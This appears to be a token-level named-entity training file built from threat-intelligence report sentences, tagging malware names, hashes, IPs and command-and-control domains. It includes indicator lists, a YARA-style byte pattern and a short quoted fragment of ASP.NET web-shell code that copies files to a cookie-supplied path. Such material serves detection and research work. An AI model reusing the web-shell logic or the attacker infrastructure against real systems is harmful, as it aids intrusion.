https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/Troj~Agent-AMEY/detailed-analysis.aspx	B-url.normal
https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/a_museu	B-url.normal
m_of_api_obfuscation_on_win32.pdf	I-url.normal
https://github.com/MinervaLabsResearch/BlogPosts	B-url.normal

The	O
malware	O
performs	O
the	O
following	O
activities	O
:	O
Builds	O
imports	O
by	O
dynamically	O
loading	O
APIs	O
Decrypts	O
strings	O
needed	O
for	O
control	O
server	O
communications	O
Performs	O
control	O
server	O
communications	O
Handles	O
commands	O
issued	O
by	O
the	O
control	O
server	O
Uninstalls	O
self	O
from	O
the	O
system	O
The	O
malicious	O
thread	O
dynamically	O
loads	O
the	O
APIs	O
it	O
needs	O
at	O
the	O
beginning	O
of	O
its	O
execution	O
using	O
LoadLibrary	O
(	O
)	O
and	O
GetProcAddress	O
(	O
)	O
.	O

In	O
addition	O
,	O
Cybereason	O
uncovered	O
new	O
variants	O
of	O
the	O
'	O
Denis	O
'	O
backdoor	O
and	O
managed	O
to	O
attribute	O
the	O
backdoor	O
to	O
the	O
OceanLotus	O
Group	O
–	O
a	O
connection	O
that	O
had	O
not	O
been	O
publicly	O
reported	O
before	O
.	O

There	O
is	O
a	O
FinSpy	B-malware.backdoor
server	O
in	O
an	O
IP	O
range	O
registered	O
to	O
'	O
Verizon	O
Wireless	O
.	O
'	O

US$25k.jar	B-malware.infosteal

98fb1014f6e90290da946fdbca583334	B-hash
Server	O
Platino8	O

The	O
Techniques	O
the	O
group	O
uses	O
keep	O
evolving	O
through	O
time	O
.	O

So	O
much	O
so	O
that	O
Microsoft	O
did	O
a	O
takedown	O
in	O
2012	O
.	O

Some	O
variants	O
of	O
EvilGrab	B-malware.drop
delete	O
the	O
.EXE	B-malware.drop
file	O
after	O
installation	O
to	O
cover	O
its	O
tracks	O
more	O
effectively	O
.	O

This	O
observation	O
may	O
reveal	O
that	O
the	O
DragonOK	B-malware.infosteal
group	O
is	O
physically	O
located	O
in	O
the	O
Jiangsu	O
province	O
.	O

The	O
algorithm	O
will	O
collect	O
the	O
op-code	O
strings	O
of	O
each	O
instruction	O
in	O
the	O
function	O
first	O
(	O
Figure	O
5	O
)	O
.	O

In	O
the	O
second	O
set	O
they	O
are	O
making	O
use	O
of	O
a	O
dynamic	O
DNS	O
service	O
by	O
ChangeIP.com	B-url.normal
.	O

The	O
exploit	O
,	O
which	O
takes	O
advantage	O
of	O
CVE-2018-4878	O
,	O
allows	O
an	O
attacker	O
to	O
execute	O
arbitrary	O
code	O
such	O
as	O
an	O
implant	O
.	O

Institute	O
for	O
Science	O
and	O
International	O
Security	O
[	O
online	O
]	O
22	O
December	O
2010	O
,	O
Available	O
:	O
http://isis-online.org/isis-reports/detail/did-stuxnet-take-out-1000-centrifuges-atthe-natanz-enrichment-plant/	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
10	O
Days	O
of	O
Rain	O
in	O
Korea	O
,	O
'	O
McAfee	O
Blog	O
Central	O
[	O
online	O
]	O
5	O
July	O
2011	O
,	O
Available	O
:	O
http://blogs.mcafee.com/mcafee-labs/10-days-of-rain-in-korea	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
Ten	O
Days	O
of	O
Rain	O
Whitepaper	O
,	O
'	O
McAfee	O
,	O
5	O
July	O
2011	O
'	O
SK	O
Hack	O
by	O
an	O
Advanced	O
Persistent	O
Threat	O
,	O
'	O
Command	O
Five	O
[	O
online	O
]	O
September	O
2011	O
,	O
Available	O
:	O
http://www.commandfive.com/papers/C5_APT_SKHack.pdf	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
Moon-young	O
Lee	O
,	O
'	O
Personal	O
information	O
hack	O
traced	O
to	O
Chinese	O
IP	O
address	O
'	O
The	O
Hankyoreh	O
[	O
online	O
]	O
12	O
August	O
2011	O
,	O
Available	O
:	O
http://www.hani.co.kr/arti/english_edition/e_national/491514.html	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
'	O
South	O
Korea	O
Probe	O
Blames	O
North	O
for	O
Cyber	O
Attack	O
'	O
VOA	O
News	O
[	O
online	O
]	O
10	O
April	O
2013	O
,	O
Available	O
:	O
http://www.voanews.com/articleprintview/1638361.html	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
J.A.P.	O
Marpaung	O
,	O
M	O
.	O

Moreover	O
,	O
we	O
decided	O
to	O
further	O
investigate	O
the	O
detection	O
rate	O
of	O
this	O
new	O
file	O
on	O
VirusTotal	O
.	O

Attachments	O
Used	O
In	O
Targeted	O
Attacks	O

Decrypted	O
version	O
of	O
comms	O
from	O
Figure	O
2	O
.	O

Detailed	O
list	O
of	O
running	O
processes	O
and	O
their	O
owners	O
.	O

If	O
Asruex	B-malware.drop
does	O
not	O
detect	O
a	O
virtual	O
machine	O
,	O
it	O
executes	O
one	O
of	O
the	O
following	O
executable	O
files	O
,	O
and	O
injects	O
a	O
DLL	O
file	O
which	O
is	O
contained	O
in	O
Asruex	B-malware.drop
.	O

Any	O
use	O
of	O
the	O
technical	O
documentation	O
or	O
the	O
information	O
contained	O
herein	O
is	O
at	O
the	O
risk	O
of	O
the	O
user	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
recipients	O
associated	O
with	O
Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
,	O
this	O
information	O
was	O
determined	O
from	O
the	O
Email	O
header	O
.	O

9563e2f443c3b4e1b00f25be0a30d56e	B-hash
FEIB_Samples_pwd	O
(	O
Virus	O
)	O
.zi_	O
TW	O
Filenames	O

//	O
100017F0	O
$	O
=	O
{	O
66	O
[	O
4-7	O
]	O
56	O
40	O
83	O
f8	O
2d	O
7c	O
?	O
?	O
}	O

The	O
top	O
five	O
countries	O
include	O
Italy	O
,	O
Turkey	O
,	O
Belgium	O
,	O
Algeria	O
,	O
and	O
France	O
.	O

DeleteUrlCacheEntryA	O
wininet.dll	O
advapi32.dll	O
kernel32.dll	O
e	O
,	O
O	O
,	O
A	O
e	O
,	O
C	O
,	O
A	O
p	O
,	O
O	O
,	O
A	O
p	O
,	O
S	O
,	O
A	O
p	O
,	O
E	O
,	O
A	O
p	O
,	O
Q	O
,	O
A	O
e	O
,	O
R	O
,	O
e	O
e	O
,	O
C	O
,	O
e	O
S	O
,	O
V	O
,	O
A	O
C	O
,	O
s	O
,	O
y	O
O	O
,	O
K	O
,	O
A	O
D	O
,	O
K	O
,	O
A	O
D	O
,	O
V	O
,	O
A	O
U	O
,	O
r	O
,	O
A	O
v	O
,	O
t	O
,	O
S	O
k	O
,	O
A	O
,	O
A	O
W	O
,	O
E	O
,	O
c	O
C	O
,	O
M	O
,	O
A	O
U	O
,	O
V	O
,	O
e	O
M	O
,	O
O	O
,	O
e	O
3,8,12	O
3,8,15	O
3,4,15	O
3,4,15	O
3,4,14	O
3,4,13	O
3,8,15	O
3,8,18	O
3,6,13	O
3,6,10	O
3,7,12	O
3,9,12	O
3,9,14	O
3,6,11	O
3,6,12	O
3,6,17	O
0,3,6	O
0,10,17	O
0,5,14	O
0,7,12	O
InternetOpenA	O
InternetConnectA	O
HttpOpenRequestA	O
HttpSendRequestA	O
HttpEndRequestA	O
HttpQueryInfoA	O
InternetReadFile	O
InternetCloseHandle	O
RegSetValueExA	O
RegCloseKey	O
RegOpenKeyExA	O
RegDeleteKeyA	O
RegDeleteValueA	O
GetUserNameA	O
ConvertSidToStringSidA	O
LookupAccountNameA	O
WinExec	O
CreateFileMappingA	O
UnmapViewOfFile	O
MapViewOfFile	O

md5	O
:	O
c488a8aaef0df577efdf1b501611ec20	B-hash
sha1	O
:	O
5ea6ae50063da8354e8500d02d0621f643827346	B-hash
sha256	O
:	O
81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf	B-hash

Given	O
the	O
ongoing	O
development	O
nature	O
of	O
this	O
malware	O
,	O
it	O
meant	O
another	O
variant	O
was	O
most	O
likely	O
due	O
.	O

2	O
The	O
primary	O
difference	O
is	O
that	O
EvilGrab	B-malware.drop
variants	O
have	O
multiple	O
layers	O
of	O
shellcode	O
.	O

Port	O

Analysis	O
of	O
the	O
Dropped	O
Executable	O
(	O
officeupdate.exe	O
)	O

This	O
APK	O
file	O
targets	O
only	O
Android-based	O
smartphones	O
.	O

Brute	O
force	O
attempts	O
showed	O
that	O
this	O
folder	O
also	O
contained	O
stisvc.exe	B-malware.unknown
(	O
md5	O
f2a1ca02bf4a63a3d4a6c6464f5a925b	B-hash
)	O
and	O
reg.exe	B-malware.unknown
;	O
these	O
have	O
same	O
functionality	O
as	O
the	O
identically	O
named	O
executables	O
found	O
on	O
games-playbox[.]com	B-url.cncsvr
.	O

There	O
are	O
3	O
types	O
of	O
lists	O
recognized	O
by	O
ZxShell	B-malware.backdoor
:	O
plain	O
ip	O
addresses	O
,	O
HTTP	O
and	O
FTP	O
addresses	O
.	O

In	O
this	O
sample	O
,	O
however	O
,	O
the	O
module	O
names	O
were	O
changed	O
from	O
actors	O
and	O
characters	O
'	O
names	O
to	O
car	O
models	O
,	O
namely	O
'	O
BMW_x1	B-malware.unknown
'	O
,	O
'	O
BMW_x2	B-malware.unknown
'	O
and	O
up	O
to	O
'	O
BMW_x8	B-malware.unknown
'	O
.	O

Unfortunately	O
for	O
our	O
theory	O
,	O
the	O
way	O
this	O
is	O
implemented	O
in	O
older	O
BlackEnergy	O
variants	O
is	O
quite	O
different	O
;	O
the	O
code	O
is	O
more	O
generic	O
and	O
the	O
list	O
of	O
extensions	O
to	O
target	O
is	O
initialized	O
at	O
the	O
beginning	O
,	O
and	O
passed	O
down	O
to	O
the	O
recursive	O
disk	O
listing	O
function	O
.	O

When	O
the	O
device	O
was	O
registered	O
on	O
the	O
MDM	B-malware.infosteal
server	O
,	O
roaming	O
was	O
disabled	O
.	O

hxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1	B-url.unknown
hxxps://www.eye-watch[.]in/design/fancybox/Pnf.action	B-url.unknown

The	O
original	O
installation	O
batch	O
script	O
ensures	O
that	O
the	O
miner	O
application	O
works	O
well	O
so	O
that	O
it	O
will	O
kill	O
all	O
scheduled	O
tasks	O
(	O
other	O
bitcoin	O
mining	O
applications	O
)	O
which	O
may	O
interfere	O
with	O
the	O
running	O
tool	O
.	O

As	O
illustrated	O
in	O
the	O
example	O
below	O
(	O
Fig	O
.	O

This	O
lead	O
us	O
into	O
speculating	O
that	O
the	O
malicious	O
code	O
was	O
developed	O
as	O
part	O
of	O
targeted	O
attacks	O
against	O
the	O
Italian	O
Marina	O
Militare	O
,	O
or	O
some	O
other	O
entities	O
associated	O
with	O
it	O
.	O

APT32	B-malware.infosteal
demonstrates	O
how	O
accessible	O
and	O
impactful	O
offensive	O
capabilities	O
can	O
be	O
with	O
the	O
proper	O
investment	O
and	O
the	O
flexibility	O
to	O
embrace	O
newly-available	O
tools	O
and	O
techniques	O
.	O

1985	O
is	O
the	O
default	O
port	O
for	O
the	O
malware	O
,	O
1986	O
is	O
the	O
lazy	O
variation	O
of	O
that	O
port	O
.	O

服务端测试	O
(	O
2	O
)	O

22	O
.	O

The	O
main	O
purpose	O
is	O
to	O
inspect	O
SWIFT	O
messages	O
for	O
strings	O
defined	O
in	O
the	O
configuration	O
file	O
.	O

They	O
noted	O
similar	O
targeting	O
campaigns	O
that	O
were	O
observed	O
exploiting	O
numerous	O
industries	O
and	O
organizations	O
within	O
Norway	O
,	O
Pakistan	O
,	O
US	O
,	O
Iran	O
,	O
China	O
,	O
Taiwan	O
,	O
Thailand	O
,	O
Jordan	O
,	O
Indonesia	O
,	O
UK	O
,	O
Germany	O
,	O
Austria	O
,	O
Poland	O
,	O
and	O
Romania	O
.	O

A	O
PwnCode	O
.	O

2.2.3	O
.	O

All	O
rights	O
reserved	O
.	O

Only	O
one	O
maintained	O
the	O
Filesystem.dll	O
code	O
,	O
while	O
another	O
maintained	O
ProcessRetranslator.dll	O
code	O
.	O

The	O
payloads	O
are	O
diversifi	O
ed	O
and	O
include	O
capabilities	O
to	O
download	O
and	O
execute	O
additional	O
binary	O
fi	O
les	O
,	O
collect	O
private	O
information	O
and	O
remotely	O
execute	O
commands	O
on	O
the	O
system	O
.	O

Perhaps	O
not	O
entirely	O
.	O

Avoiding	O
these	O
toolsets	O
during	O
analysis	O
makes	O
the	O
overall	O
investigation	O
even	O
more	O
complex	O
.	O

The	O
URL	O
in	O
question	O
points	O
to	O
:	O
This	O
link	O
does	O
not	O
work	O
and	O
will	O
redirect	O
a	O
visitor	O
back	O
to	O
the	O
main	O
page	O
of	O
the	O
website	O
.	O

One	O
of	O
these	O
name	O
servers	O
,	O
BULKBREAKERS.COM	B-url.cncsvr
,	O
contains	O
several	O
other	O
international	O
financial	O
institutions	O
.	O

Overall	O
,	O
the	O
malware	O
is	O
very	O
cautious	O
and	O
deterministic	O
in	O
running	O
its	O
main	O
code	O
.	O

Win32/Spy.Agent.ORM	B-malware.infosteal
(	O
also	O
known	O
as	O
Win32/Toshliph	O
)	O
is	O
a	O
trojan	O
used	O
as	O
one	O
of	O
their	O
first-stage	O
payloads	O
by	O
the	O
Carbanak	B-malware.infosteal
gang	O
.	O

20	O

The	O
code	O
above	O
uses	O
the	O
chr	O
(	O
)	O
function	O
to	O
convert	O
an	O
integer	O
into	O
a	O
character	O
,	O
which	O
is	O
then	O
passed	O
as	O
an	O
argument	O
to	O
the	O
ASP	O
Request	O
(	O
)	O
object	O
.	O

It	O
is	O
not	O
clear	O
why	O
EvilGrab	B-malware.drop
specifically	O
targets	O
these	O
products	O
.	O

This	O
focused	O
intelligence	O
and	O
detection	O
effort	O
led	O
to	O
new	O
external	O
victim	O
identifications	O
as	O
well	O
as	O
providing	O
sufficient	O
technical	O
evidence	O
to	O
link	O
twelve	O
prior	O
intrusions	O
,	O
consolidating	O
four	O
previously	O
unrelated	O
clusters	O
of	O
threat	O
actor	O
activity	O
into	O
FireEye	O
's	O
newest	O
named	O
advanced	O
persistent	O
threat	O
group	O
:	O
APT32	B-malware.infosteal
.	O

Strategic	O
cyber	O
LLC	O
Founder	O
and	O
Principal	O
January	O
,	O
2012-now	O
Delaware	O
Air	O
National	O
Guard	O
Major	O
2009-now	O
Cobalt	O
strike	O
Automattic	O
Principal	O
Investigator	O
November	O
,	O
2011-	O
May	O
,	O
2012	O
Senior	O
Security	O
Engineer	O
August	O
,	O
2010	O
–	O
June	O
,	O
2011	O
Code	O
Wrangler	O
July	O
,	O
2009	O
–	O
August	O
,	O
2010	O
Feedback	O
Army	O
,	O
After	O
the	O
Deadline	O
Founder	O
July	O
,	O
2008	O
–November	O
,	O
2009	O
Air	O
Force	O
Research	O
Laboratory	O
Systems	O
Engineer	O
April	O
,	O
2006	O
–	O
March	O
,	O
2008	O
US	O
Air	O
Force	O
Communications	O
and	O
March	O
,	O
2004	O
-	O
March	O
,	O
2008	O
Information	O
Officer	O

The	O
latter	O
decrypts	O
the	O
final	O
layer	O
:	O
the	O
backdoor	O
.	O

A	O
series	O
of	O
samples	O
show	O
up	O
that	O
do	O
not	O
follow	O
the	O
pattern	O
.	O

APT	O
Trends	O
report	O
Q3	O
2017	O
Wild	O
Neutron	O
–	O
Economic	O
espionage	O
threat	O
actor	O
returns	O
with	O
new	O
tricks	O
The	O
Naikon	O
APT	O
and	O
the	O
MsnMM	O
Campaigns	O
Darkhotel	O
's	O
attacks	O
in	O
2015	O
The	O
Chronicles	O
of	O
the	O
Hellsing	O
APT	O
:	O
the	O
Empire	O
Strikes	O
Back	O

These	O
files	O
were	O
received	O
in	O
intervals	O
through	O
the	O
fall	O
and	O
summer	O
,	O
going	O
back	O
to	O
May	O
2012	O
,	O
and	O
reveal	O
more	O
hints	O
about	O
targets	O
.	O

Register	O
a	O
domain	O
spoofing	O
a	O
webmail	O
service	O
or	O
an	O
organization	O
's	O
webmail	O
portal	O
(	O
e.g.	O
,	O
0nedrive-0ffice365[.]com	B-url.unknown
)	O
Send	O
exploit	O
document	O
to	O
victim	O
.	O

The	O
campaign	O
we	O
discovered	O
showcases	O
a	O
clear	O
use	O
of	O
Lazarus	O
TTPs	O
to	O
target	O
cryptocurrency	O
exchanges	O
and	O
social	O
institutions	O
in	O
South	O
Korea	O
.	O

The	O
use	O
of	O
low­key	O
file­sharing	O
sites	O
appears	O
to	O
be	O
a	O
feature	O
of	O
the	O
campaign	O
as	O
far	O
as	O
we	O
can	O
tell	O
,	O
with	O
a	O
few	O
other	O
similar	O
sites	O
being	O
used	O
in	O
the	O
same	O
way	O
.	O

Attacks	O
have	O
continued	O
since	O
then	O
,	O
right	O
through	O
to	O
2017	O
.	O

area.wthelpdesk(.)com	B-url.unknown
cdn.incloud-go(.)com	B-url.unknown
center.shenajou(.)com	B-url.unknown
commissioner.shenajou(.)com	B-url.unknown
development.shenajou(.)com	B-url.unknown
dick.ccfchrist(.)com	B-url.unknown
document.shenajou(.)com	B-url.unknown
download.windowsupdate.dedgesuite(.)net	B-url.unknown
edgar.ccfchrist(.)com	B-url.unknown
ewe.toshste(.)com	B-url.unknown
fabian.ccfchrist(.)com	B-url.unknown
flea.poulsenv(.)com	B-url.unknown
foal.wchildress(.)com	B-url.unknown
fukuoka.cloud-maste(.)com	B-url.unknown
gavin.ccfchrist(.)com	B-url.unknown
glicense.shenajou(.)com	B-url.unknown
hamiltion.catholicmmb(.)com	B-url.unknown
hukuoka.cloud-maste(.)com	B-url.unknown
images.tyoto-go-jp(.)com	B-url.unknown
interpreter.shenajou(.)com	B-url.unknown
james.tffghelth(.)com	B-url.unknown
kawasaki.cloud-maste(.)com	B-url.unknown
kawasaki.unhamj(.)com	B-url.unknown
kennedy.tffghelth(.)com	B-url.unknown
lennon.fftpoor(.)com	B-url.unknown
license.shenajou(.)com	B-url.unknown
lion.wchildress(.)com	B-url.unknown
lizard.poulsenv(.)com	B-url.unknown
malcolm.fftpoor(.)com	B-url.unknown
ms.ecc.u-tokyo-ac-jp(.)com	B-url.unknown
msn.incloud-go(.)com	B-url.unknown
sakai.unhamj(.)com	B-url.unknown
sappore.cloud-maste(.)com	B-url.unknown
sapporo.cloud-maste(.)com	B-url.unknown
scorpion.poulsenv(.)com	B-url.unknown
shrimp.bdoncloud(.)com	B-url.unknown
sindeali(.)com	B-url.unknown
style.u-tokyo-ac-jp(.)com	B-url.unknown
trout.belowto(.)com	B-url.unknown
ukuoka.cloud-maste(.)com	B-url.unknown
v4.windowsupdate.dedgesuite(.)net	B-url.unknown
vmmini(.)com	B-url.unknown
whale.toshste(.)com	B-url.unknown
windowsupdate.dedgesuite(.)net	B-url.unknown
windowsupdate.wcwname(.)com	B-url.unknown
www.cloud-maste(.)com	B-url.unknown
www.foal.wchildress(.)com	B-url.unknown
www.fukuoka.cloud-maste(.)com	B-url.unknown
www.incloud-go(.)com	B-url.unknown
www.kawasaki.cloud-maste(.)com	B-url.unknown
www.kawasaki.unhamj(.)com	B-url.unknown
www.lion.wchildress(.)com	B-url.unknown
www.msn.incloud-go(.)com	B-url.unknown
www.sakai.unhamj(.)com	B-url.unknown
www.sapporo.cloud-maste(.)com	B-url.unknown
www.unhamj(.)com	B-url.unknown
www.ut-portal-u-tokyo-ac-jp.tyoto-go-jp(.)com	B-url.unknown
www.vmmini(.)com	B-url.unknown
www.wchildress(.)com	B-url.unknown
www.yahoo.incloud-go(.)com	B-url.unknown
yahoo.incloud-go(.)com	B-url.unknown
zebra.bdoncloud(.)com	B-url.unknown
zebra.incloud-go(.)com	B-url.unknown
zebra.wthelpdesk(.)com	B-url.unknown

Hash	O

The	O
packet	O
structure	O
still	O
implements	O
the	O
same	O
13-byte	O
header	O
format	O
,	O
including	O
the	O
starting	O
zlib	O
compression	O
bytes	O
of	O
'	O
78	O
9C	O
'	O
:	O

In	O
the	O
malware	O
,	O
if	O
a	O
domain	O
is	O
configured	O
,	O
it	O
will	O
retrieve	O
domain.tld/myip.txt	O
.	O

About	O
Symantec	O

Several	O
victims	O
allege	O
that	O
they	O
have	O
been	O
physically	O
followed	O
,	O
had	O
their	O
homes	O
broken	O
into	O
,	O
and	O
been	O
tracked	O
using	O
GPS	O
devices	O
.	O

In	O
2013	O
,	O
it	O
was	O
reported	O
that	O
Frutas	B-malware.infosteal
RAT	I-malware.infosteal
was	O
used	O
in	O
phishing	O
email	O
campaigns	O
against	O
high	O
profile	O
companies	O
in	O
Europe	O
and	O
Asia	O
in	O
sectors	O
such	O
as	O
finance	O
,	O
mining	O
,	O
telecom	O
,	O
and	O
government	O
2	O
.	O

We	O
have	O
no	O
knowledge	O
on	O
the	O
identity	O
of	O
the	O
target	O
,	O
but	O
we	O
can	O
assume	O
he	O
might	O
part	O
of	O
the	O
Vietnamese	O
academic	O
community	O
.	O

This	O
claim	O
is	O
supported	O
by	O
the	O
language	O
used	O
in	O
the	O
spear-phishing	O
emails	O
,	O
which	O
appear	O
to	O
be	O
written	O
by	O
native	O
speakers	O
.	O

Claudio	O
Guarnieri	O
at	O
Rapid7	O
(	O
one	O
of	O
the	O
authors	O
of	O
this	O
report	O
)	O
was	O
the	O
first	O
to	O
search	O
for	O
these	O
servers	O
.	O

Introduction	O

1	O
*	O
http://news.grouptumbler.com/news/feed.php	O
?	O

We	O
examined	O
the	O
behavior	O
of	O
the	O
command	O
and	O
control	O
domains	O
used	O
by	O
Operation	B-malware.ransom
Manul	I-malware.ransom
as	O
they	O
moved	O
from	O
IP	O
to	O
IP	O
.	O

Decoded	O
traffic	O
:	O

Wpscan	O
—	O
a	O
WordPress	O
vulnerability	O
scanner	O
that	O
uses	O
the	O
blackbox	O
principle	O
,	O
i.e.	O
,	O
works	O
without	O
access	O
to	O
the	O
source	O
code	O
.	O

Over	O
the	O
last	O
few	O
weeks	O
,	O
the	O
Check	O
Point	O
Threat	O
Intelligence	O
Team	O
discovered	O
the	O
comeback	O
of	O
an	O
APT	O
surveillance	O
attack	O
against	O
institutions	O
across	O
the	O
Middle	O
East	O
,	O
specifically	O
the	O
Palestinian	O
Authority	O
.	O

Multiple	O
C	O
&	O
Cs	O
can	O
be	O
delimited	O
with	O
the	O
'	O
|	O
'	O
character	O
.	O

125.214.195.17	B-ip.unknown
196.29.166.218	B-ip.unknown

In	O
summer	O
2015	O
,	O
an	O
APT29	B-malware.backdoor
spearphishing	O
campaign	O
directed	O
emails	O
containing	O
a	O
malicious	O
link	O
to	O
over	O
1,000	O
recipients	O
,	O
including	O
multiple	O
U.S.	O
Government	O
victims	O
.	O

An	O
employee	O
at	O
the	O
U.S.	O
Department	O
of	O
State	O
(	O
state.gov	O
)	O
.	O

+23	O
in	O
new	O
version	O
Fingerprint	O
Sets	O
the	O
session	O
ID	O
Creates	O
a	O
process	O
and	O
gets	O
the	O
output	O
(	O
using	O
pipes	O
)	O
Sets	O
the	O
connection	O
retry	O
counter	O
Delays	O
polling	O
time	O
Reads	O
a	O
file	O
or	O
registry	O
key	O
and	O
computes	O
the	O
MD5	O
Creates	O
a	O
process	O
Creates	O
a	O
file	O
,	O
a	O
registry	O
entry	O
or	O
a	O
stream	O
in	O
memory	O
Writes	O
to	O
the	O
registry	O
Queries	O
the	O
registry	O
Searches	O
for	O
files	O
on	O
the	O
system	O
Moves	O
files	O
to	O
another	O
directory	O
Deletes	O
files	O
from	O
the	O
disk	O
List	O
the	O
drives	O
mapped	O
on	O
the	O
system	O
using	O
the	O

Second	O
stage	O
DLL	O
internal	O
name	O
and	O
export	O

The	O
Poseidon	B-malware.infosteal
Group	O
actively	O
targets	O
this	O
sort	O
of	O
corporate	O
environment	O
for	O
the	O
theft	O
of	O
intellectual	O
property	O
and	O
commercial	O
information	O
,	O
occasionally	O
focusing	O
on	O
personal	O
information	O
on	O
executives	O
.	O

[	O
%	O
path	O
to	O
the	O
application	O
's	O
executable	O
file	O
%	O
:	O
'	O
%	O
window	O
title	O
%	O
'	O
]	O

T	O
he	O
Sonypsps[.]com	B-url.unknown
domain	O
was	O
last	O
updated	O
using	O
GoDaddy	O
on	O
2017	O
-05-05	O
until	O
2019-03-13	O
.	O

15	O
Sept	O
.	O

Until	O
now	O
this	O
component	O
was	O
only	O
available	O
for	O
Windows	O
,	O
Linux	O
and	O
iOS	O
operating	O
systems	O
.	O

This	O
decryption	O
key	O
immediately	O
follows	O
the	O
length	O
field	O
.	O

Data	O
written	O
to	O
the	O
files	O
is	O
encrypted	O
using	O
AES-256-CBC	O
(	O
with	O
no	O
padding	O
)	O
.	O

The	O
predefined	O
groups	O
of	O
application	O
names	O
retrieved	O
from	O
the	O
hardcoded	O
configuration	O
data	O
set	O
the	O
scope	O
of	O
Babar	O
's	O
hooking	O
advances	O
:	O
Internet	O
communication	O
File	O
creation	O
Media	O
The	O
respective	O
trampolines	O
steal	O
data	O
going	O
in	O
or	O
out	O
of	O
the	O
hooked	O
APIs	O
on	O
the	O
fly	O
.	O

[	O
그림	O
7	O
]	O
원격	O
실행	O
명령어	O
중앙관리	O
솔루션	O
B의	O
취약점을	O
이용한	O
공격은	O
2015년부터	O
2017년까지	O
존재했다	O
.	O

getCryptoRawPacket	O
]	O

Jobwork1.php	O
or	O
Jobwork2.php	O
,	O
if	O
the	O
C2	O
response	O
satisfies	O
the	O
condition	O
then	O
it	O
downloads	O
&	O
executes	O
the	O
file	O
.	O

XtremeRAT	B-malware.backdoor
backdoors	O
maintain	O
and	O
reference	O
configuration	O
data	O
that	O
was	O
chosen	O
by	O
the	O
attacker	O
at	O
the	O
time	O
they	O
were	O
built	O
.	O

The	O
X-Agent	B-malware.infosteal
Android	O
variant	O
does	O
not	O
exhibit	O
a	O
destructive	O
function	O
and	O
does	O
not	O
interfere	O
with	O
the	O
function	O
of	O
the	O
original	O
30.apk	B-malware.backdoor
application	O
.	O

Their	O
malware	O
samples	O
are	O
present	O
in	O
the	O
same	O
cluster	O
:	O

Install	O

Register	O
a	O
domain	O
spoofing	O
that	O
of	O
a	O
legitimate	O
organization	O
(	O
e.g.	O
,	O
theguardiannews[.]org	O
)	O
.	O

The	O
backdoor	O
has	O
the	O
ability	O
to	O
enumerate	O
processor	O
,	O
memory	O
,	O
drive	O
,	O
and	O
volume	O
information	O
,	O
execute	O
commands	O
directly	O
from	O
the	O
attacker	O
,	O
enumerate	O
and	O
remove	O
files	O
and	O
folders	O
,	O
and	O
upload	O
and	O
download	O
files	O
.	O

Examination	O
of	O
network	O
traffic	O
also	O
identifies	O
the	O
implant	O
as	O
ShadowTech	B-malware.infosteal
RAT	I-malware.infosteal
.	O

7	O
.	O

The	O
malware	O
attempts	O
to	O
download	O
a	O
remote	O
file	O
called	O
'	O
123.functions	B-malware.backdoor
'	O
:	O

Figure	O
2	O
.	O

They	O
were	O
submitted	O
on	O
the	O
same	O
date	O
they	O
were	O
last	O
saved	O
.	O

The	O
provided	O
information	O
can	O
also	O
help	O
inform	O
ongoing	O
intelligence	O
analyses	O
and	O
forensic	O
investigations	O
,	O
particularly	O
for	O
compromise	O
discovery	O
,	O
damage	O
assessment	O
,	O
and	O
attribution	O
.	O

Next	O
,	O
the	O
code	O
uses	O
the	O
IsValidUser	O
(	O
)	O
method	O
and	O
checks	O
the	O
Hyper	O
Text	O
Transport	O
Protocol	O
(	O
HTTP	O
)	O
headers	O
for	O
the	O
Keep-Alive	O
value	O
,	O
which	O
,	O
if	O
equal	O
to	O
320	O
,	O
will	O
return	O
true	O
.	O

This	O
script	O
is	O
embedded	O
in	O
the	O
'	O
upnphost.exe	O
'	O
file	O
as	O
resource	O
,	O
and	O
,	O
when	O
it	O
is	O
launched	O
,	O
it	O
communicates	O
with	O
this	O
other	O
server	O
in	O
HTTPS	O
,	O
sending	O
some	O
information	O
about	O
the	O
victim	O
's	O
computer	O
.	O

Here	O
is	O
an	O
example	O
of	O
a	O
spearphishing	O
email	O
sent	O
to	O
one	O
of	O
the	O
biggest	O
Forex-trading	O
companies	O
:	O
Roughly	O
translated	O
from	O
Russian	O
to	O
English	O
,	O
it	O
says	O
:	O

Sample	O
lure	O
document	O
used	O
in	O
the	O
new	O
campaign	O

Throughout	O
our	O
investigation	O
,	O
we	O
observed	O
several	O
malicious	O
documents	O
used	O
to	O
attack	O
victims	O
,	O
which	O
we	O
will	O
discuss	O
.	O

Size	O

The	O
HIGHTIDE	B-malware.backdoor
backdoor	O
connected	O
directly	O
to	O
141.108.2.157	B-ip.unknown
.	O

caidao.exe	O
5001ef50c7e869253a7c152a638eab8a	B-hash

ed65bbe9498d3fb1e4d4ac0058590d88	O

Therefore	O
,	O
in	O
order	O
to	O
provide	O
additional	O
security	O
,	O
user	O
interface	O
objects	O
are	O
managed	O
using	O
window	O
stations	O
and	O
desktops	O
,	O
which	O
themselves	O
are	O
securable	O
objects	O
.	O
'	O
.	O

This	O
is	O
internally	O
called	O
'	O
yay_release.dll	O
'	O
:	O

Observe	O
the	O
size	O
of	O
the	O
file	O
above	O
.	O

ToString	O
(	O
)	O
)	O
)	O
;	O
catch	O
(	O
Exception	O
)	O
Page.Visible	O
=	O
false	O
;	O
Response.End	O
(	O
)	O
;	O
private	O
void	O
Init	O
(	O
)	O
if	O
(	O
Request.Cookies	O
[	O
'	O
cp	O
'	O
]	O
!	O
=	O
null	O
)	O
File.Copy	O
(	O
Request.PhysicalPath	O
,	O
Request.Cookies	O
[	O
'	O
cp	O
'	O
]	O
.Value	O
,	O
true	O
)	O
;	O
Response.Cookies	O
[	O
'	O
cp	O
'	O
]	O
.Expires	O
=	O
DateTime.Now.AddDays	O
(	O
-1	O
)	O
;	O
Response.End	O
(	O
)	O
;	O
catch	O
(	O
Exception	O
ex	O
)	O
Log	O
(	O
ex	O
.	O

